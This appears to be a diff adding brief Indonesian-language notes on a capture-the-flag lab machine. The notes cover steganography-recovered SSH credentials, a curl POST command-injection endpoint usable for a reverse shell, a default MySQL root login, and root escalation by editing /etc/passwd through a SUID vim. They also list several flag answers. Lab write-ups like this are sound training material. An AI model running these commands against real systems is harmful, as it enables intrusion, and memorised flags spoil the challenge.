@@ -1,0 +1,45 @@
+1. dir fuzz -> scan nmap -> -p- -> ada yg http server isinya img doang
+2. exiftool gada -> steghide extract -sf namafoto -> nanti ada creds -> coba ssh
+
+
+flag 1 :
+- di dir /home/food -> ls -la aja cat .food nya
+- thm{58a3cb46855af54d0660b34fd20a04c1}
+
+
+flag 2 :
+- di dir /var ada juga flag
+- thm{0c48608136e6f8c86aecdb5d4c3d7ba8}
+
+flag 3 : 
+- di dir /home/bread ada flag cat aja  
+- thm{7baf5aa8491a4b7b1c2d231a24aec575}
+- di bread juga ada file go -> dia bakal run server api 
+- http://10.10.68.196:15065/api/cmd -> cuman bisa pakai post
+- curl -X POST http://10.10.68.196:15065/api/cmd -d "ls -la" bisa nanti revshell juga
+
+flag 4 :
+- ini baca wu -> ternyata di mysql nya root:root
+- mysql -u root -h ip -p -> nanti select user nya
+- thm{2f30841ff8d9646845295135adda8332}
+
+
+flag 5 :
+- ini baca wu -> dah cari priv esc aja -> pake linpeas aja dah
+- /usr/bin/vim.basic -> unknown suid bin
+- bisa edit2 /etc/passwd pake itu -> ke home ramen aja -> vim.basic /etc/passwd
+- nah bagian x nya bisa di edit -> root aja lgsg
+- openssl passwd -1 passwordmu apa -> gantiin pake itu bagian x nya
+- daemon:[ini nya]:1:1 -> tinggal su root passwordmu
+- /root/flag -> thm{9f1ee18d3021d135b03b943cc58f34db}
+
+
+flag 6 :
+- dir /home/thm
+- thm{5a926ab5d3561e976f4ae5a7e2d034fe}
+
+flag 7 :
+- gatau
+
+flag 8 :
+- gatau   
